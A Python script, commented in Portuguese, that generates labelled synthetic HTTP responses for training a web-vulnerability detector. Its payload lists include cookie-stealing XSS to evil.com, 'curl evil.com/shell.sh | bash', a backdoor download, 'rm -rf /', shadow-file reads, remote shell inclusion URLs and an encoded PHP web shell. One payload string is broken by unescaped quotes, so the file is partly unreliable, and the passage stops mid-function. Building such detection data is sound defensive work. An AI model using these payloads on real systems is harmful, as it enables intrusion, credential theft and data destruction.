#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Gerador de Dados Sintéticos para Vulnerabilidades Web

Este script gera automaticamente um grande conjunto de dados sintéticos
para treinamento de modelos de detecção de vulnerabilidades web, incluindo:
- SQL Injection (SQLi)
- Cross-Site Scripting (XSS)
- Command Injection
- XPATH Injection
- NoSQL Injection
- Local/Remote File Inclusion

Funcionalidades:
- Download de datasets públicos de vulnerabilidades
- Geração de exemplos sintéticos através de templates e mutação
- Balanceamento de classes
- Diversidade de contextos e tipos de vulnerabilidades
- Exportação pronta para uso com o sistema de treinamento existente
"""

import os
import sys
import json
import time
import random
import string
import requests
import pandas as pd
import numpy as np
import re
import csv
import gzip
import io
import urllib.request
from pathlib import Path
from datetime import datetime
from tqdm import tqdm
from urllib.parse import urlparse, quote, urlencode
from colorama import init, Fore, Style

# Inicializa colorama
init(autoreset=True)

# Configurações globais
OUTPUT_DIR = "dados_treinamento"
SYNTHETIC_OUTPUT_FILE = os.path.join(OUTPUT_DIR, f"dados_sinteticos_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv")
COMBINED_OUTPUT_FILE = os.path.join(OUTPUT_DIR, "dados_combinados.csv")
DOWNLOAD_DIR = os.path.join(OUTPUT_DIR, "downloads")
CACHE_DIR = os.path.join(OUTPUT_DIR, "cache")

# Criação dos diretórios necessários
os.makedirs(OUTPUT_DIR, exist_ok=True)
os.makedirs(DOWNLOAD_DIR, exist_ok=True)
os.makedirs(CACHE_DIR, exist_ok=True)

# Templates para geração de dados
# Estruturas de URLs e formulários comuns
URL_TEMPLATES = [
    "http://example.com/search.php?q={payload}",
    "http://example.com/profile.php?id={payload}",
    "http://example.com/login.php?username={payload}&password=test",
    "http://example.com/product.php?category={payload}",
    "http://example.com/news.php?article={payload}",
    "http://example.com/view.php?page={payload}",
    "http://example.com/user/{payload}/profile",
    "http://example.com/api/items?filter={payload}",
    "http://example.com/books/view?isbn={payload}",
    "http://example.com/comments/list?post_id={payload}"
]

# Contextos HTML para XSS
HTML_CONTEXTS = [
    "<div class=\"search-results\">Results for: {payload}</div>",
    "<input type=\"text\" value=\"{payload}\" />",
    "<a href=\"{payload}\">Click here</a>",
    "<script>var searchTerm = \"{payload}\";</script>",
    "<div data-content=\"{payload}\"></div>",
    "<p>Welcome, {payload}!</p>",
    "<!-- User input: {payload} -->",
    "<textarea>{payload}</textarea>",
    "<meta name=\"description\" content=\"{payload}\">",
    "<button onclick=\"showDetails('{payload}')\">Details</button>"
]

# Contextos SQL para SQLi
SQL_CONTEXTS = [
    "SELECT * FROM users WHERE username = '{payload}'",
    "SELECT * FROM products WHERE category_id = {payload}",
    "SELECT * FROM articles WHERE author_id = {payload} ORDER BY date DESC",
    "INSERT INTO comments (post_id, comment) VALUES (5, '{payload}')",
    "UPDATE users SET bio = '{payload}' WHERE id = 42",
    "SELECT * FROM messages WHERE conversation_id = {payload} AND deleted = 0",
    "SELECT * FROM logs WHERE action = '{payload}' AND timestamp > DATE_SUB(NOW(), INTERVAL 1 DAY)",
    "DELETE FROM cart_items WHERE product_id = {payload} AND user_id = 123",
    "SELECT COUNT(*) FROM visits WHERE page = '{payload}' GROUP BY date",
    "SELECT * FROM search_history WHERE term LIKE '%{payload}%'"
]

# Contextos de shell para Command Injection
CMD_CONTEXTS = [
    "ping -c 4 {payload}",
    "echo {payload} > /tmp/log.txt",
    "find /var/www -name \"{payload}\" -type f",
    "grep \"{payload}\" /var/log/access.log",
    "whois {payload}",
    "nslookup {payload}",
    "cat /home/users/{payload}/profile.txt",
    "tar -cf /backups/{payload}.tar /var/www/uploads/",
    "curl -s {payload} | grep title",
    "convert {payload} -resize 100x100 thumb.jpg"
]

# Contextos NoSQL para NoSQL Injection
NOSQL_CONTEXTS = [
    "db.users.find({username: '{payload}'})",
    "db.products.find({category: '{payload}'})",
    "db.logs.find({ip: '{payload}', timestamp: {$gt: new Date('2023-01-01')}})",
    "db.orders.updateOne({_id: ObjectId('123')}, {$set: {status: '{payload}'}})",
    "db.articles.find({tags: {$elemMatch: {$eq: '{payload}'}}})",
    "db.customers.find({$where: 'this.name === \'{payload}\''})",
    "db.inventory.find({price: {$gt: {payload}}})",
    "db.messages.find({$or: [{sender: '{payload}'}, {recipient: '{payload}'}]})",
    "db.visits.aggregate([{$match: {page: '{payload}'}}, {$group: {_id: '$date', count: {$sum: 1}}}])",
    "db.config.findOne({setting: '{payload}'})"
]

# Templates para File Inclusion
FILE_INCLUSION_CONTEXTS = [
    "include('{payload}');",
    "require_once('{payload}');",
    "<?php include_once('{payload}'); ?>",
    "$template = '{payload}'; include($template);",
    "<jsp:include page=\"{payload}\" />",
    "<%@include file=\"{payload}\" %>",
    "#include \"{payload}\"",
    "def load_config(config_file='{payload}'):\n    exec(open(config_file).read())",
    "from {payload} import settings",
    "Response.Write(Server.MapPath('{payload}'))"
]

# Templates para XPATH Injection
XPATH_CONTEXTS = [
    "//user[username='{payload}' and password='secret']",
    "//product[@id='{payload}']/price",
    "//book[author='{payload}']/title",
    "//message[contains(text(), '{payload}')]",
    "//config[@name='{payload}']/@value",
    "//user[@role='{payload}']/permissions/*",
    "//order[@id='{payload}']/items/item",
    "//article[category='{payload}' and @published='true']/title",
    "//log[action='{payload}' and @timestamp > '2023-01-01']",
    "//friend[name='{payload}' or email='{payload}']"
]

# Payloads para diferentes tipos de vulnerabilidades
# SQLi - Payloads para SQL Injection
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    "\" OR \"1\"=\"1",
    "\" OR \"1\"=\"1\" --",
    "1' OR '1'='1",
    "1\" OR \"1\"=\"1",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "\" OR 1=1--",
    "\" OR 1=1#",
    "\" OR 1=1/*",
    "') OR ('1'='1",
    "')) OR (('1'='1",
    "1)) OR ((1=1",
    "admin'--",
    "admin'#",
    "' UNION SELECT 1,2,3--",
    "' UNION SELECT 1,2,3,4--",
    "' UNION SELECT username,password,1,2 FROM users--",
    "' UNION SELECT NULL,NULL,NULL,NULL--",
    "1' ORDER BY 10--",
    "1' GROUP BY 1,2,3--",
    "' HAVING 1=1--",
    "' SLEEP(5)--",
    "' WAITFOR DELAY '0:0:5'--",
    "1; SELECT * FROM users",
    "1'; DROP TABLE users--",
    "1'; INSERT INTO logs VALUES('hacked')--",
    "'; EXEC xp_cmdshell('dir')--"
]

# XSS - Payloads para Cross-Site Scripting
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<script>alert(document.cookie)</script>",
    "<img src=x onerror=alert('XSS')>",
    "<img src=x onerror=alert(document.cookie)>",
    "<svg onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<iframe src=javascript:alert('XSS')>",
    "<a href=javascript:alert('XSS')>Click me</a>",
    "<div onmouseover=alert('XSS')>Hover me</div>",
    "<button onclick=alert('XSS')>Click me</button>",
    "<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>",
    "<script>new Image().src='https://evil.com/steal?cookie='+document.cookie</script>",
    "<script>location='https://evil.com/steal?cookie='+document.cookie</script>",
    "javascript:alert('XSS')",
    "<svg/onload=alert('XSS')>",
    "<svg><script>alert('XSS')</script>",
    "'><script>alert('XSS')</script>",
    "\"><script>alert('XSS')</script>",
    "</script><script>alert('XSS')</script>",
    "<scr<script>ipt>alert('XSS')</script>",
    "<script>a=eval;b=alert;a(b('XSS'));</script>",
    "<script>\u0061\u006C\u0065\u0072\u0074('XSS')</script>",
    "<script>document.write('<img src=x onerror=alert(1)>')</script>",
    "<style>@keyframes x{}</style><xss style=animation-name:x onanimationend=alert('XSS')>"
]

# CMD - Payloads para Command Injection
CMD_PAYLOADS = [
    "; ls -la",
    "& dir",
    "| cat /etc/passwd",
    "`whoami`",
    "$(id)",
    "; echo 'Vulnerable to command injection'",
    " && whoami",
    " || id",
    "; ping -c 4 127.0.0.1",
    "| net user",
    "; cat /etc/shadow",
    "& type C:\\Windows\\win.ini",
    "`which bash`",
    "$(curl http://evil.com/shell.sh | bash)",
    "; wget http://evil.com/backdoor -O /tmp/backdoor",
    "| python -c 'import os; os.system("id")'",
    "; rm -rf /",
    "& del /f /s /q c:\\",
    "; echo 'Vulnerable' > /tmp/test.txt",
    "| echo 'Vulnerable' > C:\\test.txt",
    "; env",
    "& set",
    "; find / -type f -name \"*.conf\"",
    "& findstr /s /i password C:\\*.txt"
]

# NOSQLI - Payloads para NoSQL Injection
NOSQLI_PAYLOADS = [
    "{'$gt': ''}",
    "{'$ne': null}",
    "{'$exists': true}",
    "{'$regex': '.*'}",
    "{'$gt': 0}",
    "{username: {$ne: ''}}",
    "{password: {$ne: ''}}",
    "{$where: 'sleep(5000)'}",
    "{$where: 'true'}",
    "{$where: '1==1'}",
    "{$or: [{}, {a:'a'}]}",
    "{$gt: ''}",
    "{$ne: 1}",
    "{$nin: []}",
    "{$not: {$eq: ''}}",
    "{username: admin, password: {$regex: '.*'}}",
    "{$expr: {$gt: ['$amount', 0]}}",
    "{$jsonSchema: {required: ['exploit']}}",
    "{$gt: {$where: 'this.exploited'}}",
    "{login: /.*admin.*/i}",
    "{'username': {'$in': [null], '$exists': true}}",
    "{'$where': 'this.password.match(/.*/)'},",
    "{'$where': 'this.username === \"admin\"'}",
    "{'username': {'$regex': 'admin', '$options': 'i'}}",
    "{'username': {'$gt': undefined}}"
]

# LFI_RFI - Payloads para Local/Remote File Inclusion
LFI_RFI_PAYLOADS = [
    "../../../etc/passwd",
    "../../../../../../etc/passwd",
    "../../../../../../../etc/passwd",
    "../../../../../../../../etc/passwd",
    "../../../../../../../../../etc/passwd",
    "../../../etc/passwd%00",
    "..././..././..././etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "..%252F..%252F..%252Fetc%252Fpasswd",
    "/etc/passwd",
    "C:\\Windows\\win.ini",
    "C:\\boot.ini",
    "../../../etc/shadow",
    "../../../proc/self/environ",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://input",
    "php://filter/resource=index.php",
    "data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=",
    "expect://id",
    "http://evil.com/shell.txt",
    "https://evil.com/backdoor.php",
    "ftp://evil.com/shell.php",
    "\\\\evil.com\\shared\\shell.php",
    "//evil.com/shell.php",
    "file:///etc/passwd",
    "dict://evil.com:1337/"
]

# XPATH - Payloads para XPATH Injection
XPATH_PAYLOADS = [
    "' or '1'='1",
    "' or ''='",
    "' or 1=1]",
    "'] | //user/*['",
    "' or '1'='1' or 'a'='a",
    "' and count(/*)=1 and '1'='1",
    "' and count(/)=1 and '1'='1",
    "' and count(/child::node())=1 and '1'='1",
    "' and name(/*)='root' and '1'='1",
    "' and local-name(/*)='root' and '1'='1",
    "' or substring(name(/*),1,1)='r' or '1'='1",
    "' or string-length(name(/*))=4 or '1'='1",
    "' or contains(name(/*), 'oot') or '1'='1",
    "' or contains(name(/child::node()), 'oot') or '1'='1",
    "admin' or '1'='1",
    "' or '1'='1' or 'a'='a",
    "' or count(/*)>0 or '1'='1",
    "' or string-length(name(/*))>0 or '1'='1",
    "' or count(parent::*)=0 or '1'='1",
    "' or count(attribute::*)>0 or '1'='1",
    "' or local-name()='root' or '1'='1",
    "' or local-name(parent::*)='root' or '1'='1",
    "' or count(//*)>0 or '1'='1",
    "' or string-length()>0 or '1'='1"
]

# Geração de HTML vulnerável
def gerar_html_vulneravel(payload, tipo_vulnerabilidade, contexto=None):
    """Gera um documento HTML vulnerável com o payload inserido em um contexto apropriado"""
    if tipo_vulnerabilidade == "xss" and contexto is None:
        contexto = random.choice(HTML_CONTEXTS)

    html_template = f"""<!DOCTYPE html>
<html>
<head>
    <title>Página com vulnerabilidade {tipo_vulnerabilidade}</title>
    <meta charset="UTF-8">
</head>
<body>
    <h1>Exemplo de {tipo_vulnerabilidade}</h1>
    <div class="content">
        {contexto.format(payload=payload) if contexto else f"<div>{payload}</div>"}
    </div>
    <div class="footer">
        <p>&copy; Exemplo de aplicação vulnerável</p>
    </div>
</body>
</html>"""

    return html_template

# Geração de resposta HTTP
def gerar_resposta_http(payload, tipo_vulnerabilidade, contexto=None, sucesso=False):
    """Gera uma resposta HTTP sintética com o payload inserido"""
    status_code = 200 if sucesso else random.choice([200, 400, 403, 500] if sucesso else [200, 400])

    if tipo_vulnerabilidade == "sqli" and contexto is None:
        contexto = random.choice(SQL_CONTEXTS)

    elif tipo_vulnerabilidade == "cmd" and contexto is None:
        contexto = random.choice(CMD_CONTEXTS)

    elif tipo_vulnerabilidade == "nosqli" and contexto is None:
        contexto = random.choice(NOSQL_CONTEXTS)

    elif tipo_vulnerabilidade == "xpath" and contexto is None:
        contexto = random.choice(XPATH_CONTEXTS)

    elif tipo_vulnerabilidade == "lfi_rfi" and contexto is None:
        contexto = random.choice(FILE_INCLUSION_CONTEXTS)

    # Cria conteúdo de resposta com base no tipo de vulnerabilidade
    if tipo_vulnerabilidade == "sqli" and sucesso:
        num_rows = random.randint(1, 10)
        colunas = ["id", "username", "email", "role"]
        linhas = []
        for _ in range(num_rows):
            user_id = random.randint(1, 1000)
            username = random.choice(["admin", "user", "moderator", "editor", "guest"])
            email = f"{username}{user_id}@example.com"
            role = random.choice(["admin", "user", "guest"])
            linhas.append([user_id, username, email, role])

        content = "Database error: You have an error in your SQL syntax\n" if random.random() < 0.3 else ""
        content += "Query: " + contexto.format(payload=payload) + "\n\n"
        content += "Results:\n"
        content += ", ".join(colunas) + "\n"
        for linha in linhas:
            content += ", ".join(str(col) for col in linha) + "\n"

    elif tipo_vulnerabilidade == "xss":
        content = gerar_html_vulneravel(payload, tipo_vulnerabilidade, contexto)

    elif tipo_vulnerabilidade == "cmd" and sucesso:
        content = "Command output:\n"
        if "passwd" in payload or "shadow" in payload:
            content += "root:x:0:0:root:/root:/bin/bash\n"
            content += "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n"
            content += "bin:x:2:2:bin:/bin:/usr/sbin/nologin\n"
        elif "ls" in payload or "dir" in payload:
            content += "total 32\n"
            content += "drwxr-xr-x 2 root root 4096 Jan 5 2023 .\n"
            content += "drwxr-xr-x 6 root root 4096 Jan 5 2023 ..\n"
            content += "-rw-r--r-- 1 root root 8138 Jan 5 2023 config.php\n"
            content += "-rw-r--r-- 1 root root 2048 Jan 5 2023 database.db\n"
        elif "whoami" in payload or "id" in payload:
            content += "uid=33(www-data) gid=33(www-data) groups=33(www-data)\n"
        else:
            content += "Command executed successfully.\n"

    elif tipo_vulnerabilidade == "nosqli" and sucesso:
        num_docs = random.randint(1, 5)
        docs = []
        for _ in range(num_docs):
            doc_id = random.randint(1, 1000)
            username = random.choice(["admin", "user", "moderator", "editor", "guest"])
            email = f"{username}{doc_id}@example.com"
            role = random.choice(["admin", "user", "guest"])
            docs.append({"_id": doc_id, "username": username, "email": email, "role": role})

        content = "MongoDB query: " + contexto.format(payload=payload) + "\n\n"
        content += "Results:\n"
        for doc in docs:
            content += json.dumps(doc) + "\n"

    elif tipo_vulnerabilidade == "lfi_rfi" and sucesso:
        if "/etc/passwd" in payload:
            content = "root:x:0:0:root:/root:/bin/bash\n"
            content += "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n"
            content += "bin:x:2:2:bin:/bin:/usr/sbin/nologin\n"
        elif "win.ini" in payload:
            content = "[windows]\n"
            content += "load=*\n"
            content += "run=*\n"
            content += "[MCI Extensions.BAK]\n"
            content += "3g2=MPEGVideo\n"
        elif "index.php" in payload or "php://" in payload:
            content = "<?php\n"
            content += "// Configuration file\n"
            content += "$database_host = 'localhost';\n"
            content += "$database_user = 'dbuser';\n"
            content += "$database_pass = 'dbpassword123';\n"
            content += "$secret_key = 'a8d4j2m9qp3f7z6x';\n"
            content += "?>\n"
        elif "http://" in payload or "https://" in payload or "ftp://" in payload:
            content = "<?php system($_GET['cmd']); ?>\n"
        else:
            content = "File contents could not be displayed.\n"

    elif tipo_vulnerabilidade == "xpath" and sucesso:
        num_nodes = random.randint(1, 5)
        nodes = []
        for i in range(num_nodes):
            node_id = random.randint(1, 1000)
            username = random.choice(["admin", "user", "moderator", "editor", "guest"])
            role = random.choice(["admin", "user", "guest"])
            nodes.append(f"<user id=\"{node_id}\"><username>{username}</username><role>{role}</role></user>")

        content = "XPath query: " + contexto.format(payload=payload) + "\n\n"
        content += "Results:\n"
        content += "<results>\n"
        for node in nodes:
            content += "  " + node + "\n"
        content += "</results>"

    else:
        # Resposta genérica não vulnerável ou para outros casos
        content = f"Processando entrada: {payload}\n\nNenhum resultado encontrado."

    # Constrói a resposta HTTP completa
    timestamp = datetime.now().strftime("%a, %d %b %Y %H:%M:%S GMT")
    content_length = len(content)

    http_response = f"HTTP/1.1 {status_code} {requests.status_codes._codes[status_code][0]}\r\n"
    http_response += f"Date: {timestamp}\r\n"
    http_response += "Server: Apache/2.4.41 (Ubuntu)\r\n"
    http_response += "Content-Type: text/html; charset=UTF-8\r\n"
    http_response += f"Content-Length: {content_length}\r\n"
    http_response += "Connection: close\r\n\r\n"
    http_response += content

    return http_response

# Função para gerar variações de um payload base
def gerar_variacoes_payload(payload_base, num_variacoes=5):
    """Gera variações de um payload base alterando caracteres, codificação, etc."""
    variacoes = [payload_base]  # Inclui o payload original

    # Funções de mutação para gerar variações
    def mutar_case():
        # Altera aleatoriamente maiúsculas/minúsculas
        return ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in payload_base)

    def adicionar_espacos():
        # Adiciona espaços extras
        resultado = payload_base
        for _ in range(random.randint(1, 3)):
            pos = random.randint(0, len(resultado))
            resultado = resultado[:pos] + " " + resultado[pos:]
        return resultado

    def url_encode():
        # Codifica alguns caracteres no formato URL
        chars_to_encode = ['<', '>', '"', "'", ';', '(', ')', '&', '|']
        resultado = ""
        for c in payload_base:
            if c in chars_to_encode and random.random() > 0.6:
                resultado += "%{:02X}".format(ord(c))
            else:
                resultado += c
        return resultado

    def html_encode():
        # Codifica alguns caracteres no formato HTML
        chars_to_encode = {'<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;', '&': '&amp;'}
        resultado = ""
        for c in payload_base:
            if c in chars_to_encode and random.random() > 0.6:
                resultado += chars_to_encode[c]
            else:
                resultado += c
        return resultado

    def comentarios_sql():
        # Adiciona comentários SQL
        if "'" in payload_base or "\"" in payload_base:
            comentarios = ['--', '#', '/**/'] 
            pos = random.randint(1, len(payload_base) - 1)
            comentario = random.choice(comentarios)
            return payload_base[:pos] + comentario + payload_base[pos:]
        return payload_base

    def unicode_escape():
        # Converte alguns caracteres para formato Unicode
        if len(payload_base) < 3:
            return payload_base

        chars = list(payload_base)
        num_chars = min(3, len(chars))
        for _ in range(num_chars):
            idx = random.randint(0, len(chars) - 1)
            c = chars[idx]
            chars[idx] = "\\u{:04x}".format(ord(c))
        return ''.join(chars)

    # Seleciona funções de mutação aleatoriamente e gera variações
    mutacoes = [mutar_case, adicionar_espacos, url_encode, html_encode, comentarios_sql, unicode_escape]

    # Gera variações até atingir o número desejado
    while len(variacoes) < num_variacoes + 1:
        # Escolhe uma função de mutação aleatória
        mutacao = random.choice(mutacoes)
        variacao = mutacao()

        # Evita duplicatas
        if variacao not in variacoes:
            variacoes.append(variacao)

    return variacoes

# Função para gerar dados sintéticos
def gerar_dados_sinteticos(num_exemplos=10000, distribuicao_vulnerabilidades=None):
    """Gera dados sintéticos para treinamento"""
    if distribuicao_vulnerabilidades is None:
        distribuicao_vulnerabilidades = {
            "sqli": 0.25,        # SQL Injection
            "xss": 0.25,         # Cross-Site Scripting
            "cmd": 0.15,         # Command Injection
            "nosqli": 0.15,      # NoSQL Injection
            "lfi_rfi": 0.10,     # Local/Remote File Inclusion
            "xpath": 0.10        # XPATH Injection
        }

    # Normaliza a distribuição
    total = sum(distribuicao_vulnerabilidades.values())
    for k in distribuicao_vulnerabilidades:
        distribuicao_vulnerabilidades[k] /= total

    print(f"{Fore.GREEN}[+] Gerando {num_exemplos} exemplos sintéticos...")

    dados = []

    # Para cada tipo de vulnerabilidade, gera exemplos proporcionais à distribuição
    for tipo_vuln, proporcao in distribuicao_vulnerabilidades.items():
        num_exemplos_tipo = int(num_exemplos * proporcao)
        print(f"{Fore.BLUE}[*] Gerando {num_exemplos_tipo} exemplos de {tipo_vuln}...")

        # Define payloads e contextos com base no tipo de vulnerabilidade
        if tipo_vuln == "sqli":
            payloads = SQLI_PAYLOADS
            contextos = SQL_CONTEXTS
        elif tipo_vuln == "xss":
            payloads = XSS_PAYLOADS
            contextos = HTML_CONTEXTS
        elif tipo_vuln == "cmd":
            payloads = CMD_PAYLOADS
            contextos = CMD_CONTEXTS
        elif tipo_vuln == "nosqli":
            payloads = NOSQLI_PAYLOADS
            contextos = NOSQL_CONTEXTS
        elif tipo_vuln == "lfi_rfi":
            payloads = LFI_RFI_PAYLOADS
            contextos = FILE_INCLUSION_CONTEXTS
        elif tipo_vuln == "xpath":
            payloads = XPATH_PAYLOADS
            contextos = XPATH_CONTEXTS
        else:
            continue

        # Gera exemplos para este tipo de vulnerabilidade
        exemplos_tipo = []
        with tqdm(total=num_exemplos_tipo, desc=f"Gerando {tipo_vuln}") as pbar:
            while len(exemplos_tipo) < num_exemplos_tipo:
                # 60% são exemplos vulneráveis, 40% não vulneráveis
                label = 1 if random.random() < 0.6 else 0

                if label == 1:  # Vulnerável
                    # Seleciona um payload aleatório e contexto
                    payload_base = random.choice(payloads)
                    contexto = random.choice(contextos)

                    # Gera variações de payload para aumentar diversidade
                    variacoes = gerar_variacoes_payload(payload_base, 3)
                    payload = random.choice(variacoes)

                    # Gera resposta HTTP com o payload
                    resposta = gerar_resposta_http(payload, tipo_vuln, contexto, sucesso=True)

                    # Adiciona à lista de exemplos
                    exemplos_tipo.append({
                        "text": resposta,
                        "label": 1,
                        "tipo_payload": tipo_vuln
                    })

                else:  # Não vulnerável
                    # Gera um payload seguro (simulando entrada normal de usuário)
                    payload_seguro = ""
                    tipo_payload = random.choice(["texto", "numero", "alfanumerico"])

                    if tipo_payload == "texto":
                        comprimento = random.randint(3, 15)
                        payload_seguro = ''.join(random.choice(string.ascii_letters + ' ') for _ in range(comprimento))
                    elif tipo_payload == "numero":
                        payload_seguro = str(random.randint(1, 10000))
                    else:  # alfanumerico
                        comprimento = random.randint(5, 12)
                        payload_seguro = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(comprimento))

                    # Gera resposta HTTP com o payload seguro
                    resposta = gerar_resposta_http(payload_seguro, tipo_vuln, random.choice(contextos), sucesso=False)

                    # Adiciona à lista de exemplos
                    exemplos_tipo.append({
                        "text": resposta,
                        "label": 0,
                        "tipo_payload": tipo_vuln
                    })

                pbar.update(1)
                if len(exemplos_tipo) >= num_exemplos_tipo:
                    break

        # Adiciona exemplos deste tipo à lista geral
        dados.extend(exemplos_tipo)

    print(f"{Fore.GREEN}[+] Geração concluída. Total de {len(dados)} exemplos sintéticos gerados.")

    return dados

# Função para baixar conjuntos de dados públicos
def baixar_dados_publicos():
    """Baixa conjuntos de dados públicos de vulnerabilidades da internet"""
    # Lista de URLs para datasets públicos conhecidos
    datasets = [
        {
            "nome": "OWASP ModSecurity CRS",
            "url": "https://raw.githubusercontent.com/coreruleset/coreruleset/v3.3/dev/regression-tests/tests/REQUEST-942-APPLICATION-ATTACK-SQLI/942100.yaml",
            "tipo": "sqli",
            "processador": "processar_yaml_crs"
        },
        {
            "nome": "PayloadsAllTheThings-SQLi",
            "url": "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/SQL%20Injection/MySQL%20Injection.md",
            "tipo": "sqli",
            "processador": "processar_markdown_payloads"
        },
        {
            "nome": "PayloadsAllTheThings-XSS",
            "url": "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XSS%20Injection/README.md",
            "tipo": "xss",
            "processador": "processar_markdown_payloads"
        },
        {
            "nome": "PayloadsAllTheThings-CommandInjection",
            "url": "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Command%20Injection/README.md",
            "tipo": "cmd",
            "processador": "processar_markdown_payloads"
        },
        {
            "nome": "PayloadsAllTheThings-NoSQLi",
            "url": "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/NoSQL%20Injection/README.md",
            "tipo": "nosqli",
            "processador": "processar_markdown_payloads"
        },
        {
            "nome": "PayloadsAllTheThings-LFI",
            "url": "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/File%20Inclusion/README.md",
            "tipo": "lfi_rfi",
            "processador": "processar_markdown_payloads"
        }
    ]

    todos_dados = []

    print(f"{Fore.GREEN}[+] Baixando conjuntos de dados públicos...")

    for dataset in datasets:
        nome = dataset["nome"]
        url = dataset["url"]
        tipo = dataset["tipo"]
        processador = dataset["processador"]

        # Cria nome do arquivo de cache
        nome_arquivo = os.path.join(CACHE_DIR, f"{nome.replace(' ', '_').lower()}.cache")

        # Verifica se já existe em cache
        if os.path.exists(nome_arquivo) and (time.time() - os.path.getmtime(nome_arquivo)) < 86400:  # 24 horas
            print(f"{Fore.BLUE}[*] Usando cache para {nome}")
            with open(nome_arquivo, 'r', encoding='utf-8') as f:
                dados = json.load(f)
                todos_dados.extend(dados)
            continue

        print(f"{Fore.BLUE}[*] Baixando {nome}...")

        try:
            # Baixa o dataset
            response = requests.get(url, timeout=30)
            response.raise_for_status()  # Verifica se houve erro no download

            conteudo = response.text

            # Processa o conteúdo de acordo com o tipo de arquivo
            dados_processados = []
            if processador == "processar_yaml_crs":
                dados_processados = processar_yaml_crs(conteudo, tipo)
            elif processador == "processar_markdown_payloads":
                dados_processados = processar_markdown_payloads(conteudo, tipo)

            # Salva em cache
            with open(nome_arquivo, 'w', encoding='utf-8') as f:
                json.dump(dados_processados, f)

            # Adiciona aos dados totais
            todos_dados.extend(dados_processados)

            print(f"{Fore.GREEN}[+] Baixado e processado {nome}: {len(dados_processados)} exemplos")

        except Exception as e:
            print(f"{Fore.RED}[!] Erro ao baixar {nome}: {str(e)}")

    print(f"{Fore.GREEN}[+] Total de {len(todos_dados)} exemplos obtidos de datasets públicos")

    return todos_dados

# Funções de processamento para diferentes formatos de dados
def processar_yaml_crs(conteudo, tipo_vulnerabilidade):
    """Processa arquivos YAML do OWASP ModSecurity CRS para extrair payloads"""
    dados = []

    # Extrai testes dos arquivos YAML do CRS
    # Formato simplificado para demonstração
    padrao_teste = re.compile(r'\s+data:\s+[\'"](.+?)[\'"]')
    matches = padrao_teste.findall(conteudo)

    for match in matches:
        payload = match

        # Gera exemplos positivos (vulneráveis)
        contexto = random.choice(SQL_CONTEXTS if tipo_vulnerabilidade == "sqli" else 
                              HTML_CONTEXTS if tipo_vulnerabilidade == "xss" else 
                              CMD_CONTEXTS if tipo_vulnerabilidade == "cmd" else 
                              NOSQL_CONTEXTS if tipo_vulnerabilidade == "nosqli" else 
                              FILE_INCLUSION_CONTEXTS)

        # Gera resposta com o payload
        resposta = gerar_resposta_http(payload, tipo_vulnerabilidade, contexto, sucesso=True)

        dados.append({
            "text": resposta,
            "label": 1,
            "tipo_payload": tipo_vulnerabilidade
        })

        # Para cada exemplo vulnerável, também gera um exemplo não vulnerável
        if random.random() < 0.5:  # 50% de chance para manter o equilíbrio
            # Gera um payload seguro
            payload_seguro = str(random.randint(1, 1000))  # Apenas um número

            # Gera resposta com o payload seguro
            resposta_segura = gerar_resposta_http(payload_seguro, tipo_vulnerabilidade, contexto, sucesso=False)

            dados.append({
                "text": resposta_segura,
                "label": 0,
                "tipo_payload": tipo_vulnerabilidade
            })

    return dados

def processar_markdown_payloads(conteudo, tipo_vulnerabilidade):
    """Processa arquivos Markdown do PayloadsAllTheThings para extrair payloads"""
    dados = []

    # Extrai payloads de blocos de código no Markdown
    # Forma simplificada para este exemplo
    padrao_codigo = re.compile(r'```(?:sql|html|javascript|php|bash)?\s*(.+?)\s*```', re.DOTALL)
    matches = padrao_codigo.findall(conteudo)

    # Também extrai payloads de listas no Markdown
    padrao_lista = re.compile(r'^[-*]\s+`(.+?)`', re.MULTILINE)
    matches_lista = padrao_lista.findall(conteudo)

    todos_payloads = []
    for match in matches:
        # Divide em linhas e processa cada linha como um payload potencial
        linhas = match.strip().split('\n')
        for linha in linhas:
            linha = linha.strip()
            if linha and not linha.startswith('#') and not linha.startswith('//') and not linha.startswith('/*') and len(linha) > 3:
                todos_payloads.append(linha)

    todos_payloads.extend(matches_lista)

    # Limita o número de payloads para evitar conjuntos muito grandes
    max_payloads = 100
    if len(todos_payloads) > max_payloads:
        todos_payloads = random.sample(todos_payloads, max_payloads)

    for payload in todos_payloads:
        if len(payload) > 500:  # Ignora payloads muito longos
            continue

        # Seleciona um contexto apropriado
        contexto = random.choice(SQL_CONTEXTS if tipo_vulnerabilidade == "sqli" else 
                              HTML_CONTEXTS if tipo_vulnerabilidade == "xss" else 
                              CMD_CONTEXTS if tipo_vulnerabilidade == "cmd" else 
                              NOSQL_CONTEXTS if tipo_vulnerabilidade == "nosqli" else 
                              FILE_INCLUSION_CONTEXTS if tipo_vulnerabilidade == "lfi_rfi" else
                              XPATH_CONTEXTS)

        # Gera resposta com o payload
        resposta = gerar_resposta_http(payload, tipo_vulnerabilidade, contexto, sucesso=True)

        dados.append({
            "text": resposta,
            "label": 1,
            "tipo_payload": tipo_vulnerabilidade
        })

        # Para cada payload vulnerável, também gera um exemplo não vulnerável
        if random.random() < 0.3:  # 30% de chance para manter o equilíbrio
            # Gera um payload seguro
            payload_seguro = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(random.randint(5, 10)))

            # Gera resposta com o payload seguro
